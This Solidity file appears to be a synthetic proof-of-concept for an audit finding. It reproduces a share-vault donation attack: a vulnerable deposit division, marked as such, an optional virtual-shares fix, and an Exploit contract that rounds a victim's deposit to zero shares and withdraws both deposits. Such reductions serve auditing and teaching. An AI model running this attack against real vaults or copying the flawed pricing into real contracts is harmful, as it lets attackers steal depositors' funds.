// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cryptex BasePocket — donation inflates pricePerShare (Cantina, finding 40210)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: deposit prices shares off token.balanceOf, so a direct transfer before
    the victim's deposit rounds her shares down to 0. The attacker then withdraws both
    deposits. The blamed division is preserved verbatim below (@> VULN). */

contract Collateral {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pocket {
    Collateral public token;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    bool public virtualShares;

    constructor(Collateral _token, bool _virtualShares) {
        token = _token;
        virtualShares = _virtualShares;
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        uint256 supply = totalSupply;
        uint256 assetsBefore = token.balanceOf(address(this));
        if (virtualShares) {
            // FIX: virtual shares and a 1-wei virtual asset, so a donation cannot round the next deposit to 0
            shares = assets * (supply + 1000) / (assetsBefore + 1);
        } else if (supply == 0) {
            shares = assets;
        } else {
            shares = assets * supply / assetsBefore; // @> VULN: rounds to 0 after a donation inflates assetsBefore
        }
        token.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[msg.sender] += shares;
    }

    function withdraw(uint256 shares) external returns (uint256 assets) {
        assets = shares * token.balanceOf(address(this)) / totalSupply;
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        token.transfer(msg.sender, assets);
    }
}

contract Alice {
    function deposit(Pocket pocket, Collateral token, uint256 amount) external returns (uint256 shares) {
        token.approve(address(pocket), amount);
        shares = pocket.deposit(amount);
    }
}

contract Exploit {
    Collateral public token; // CREATE nonce 1
    Pocket public pocket; // CREATE nonce 2
    Alice public alice; // CREATE nonce 3
    uint256 public bobOut;
    uint256 public aliceShares;

    constructor() {
        token = new Collateral();
        pocket = new Pocket(token, false);
        alice = new Alice();
        token.mint(address(this), 1e18 + 1);
        token.mint(address(alice), 1e18);
    }

    function run() external {
        token.approve(address(pocket), type(uint256).max);
        pocket.deposit(1);
        token.transfer(address(pocket), 1e18);
        aliceShares = alice.deposit(pocket, token, 1e18);
        bobOut = pocket.withdraw(1);
        require(aliceShares == 0, "alice shares");
        require(token.balanceOf(address(alice)) == 0, "alice lost 1e18");
        require(bobOut == 2e18 + 1, "bob withdrew both deposits");
        require(token.balanceOf(address(this)) == 2e18 + 1, "bob balance");
    }
}
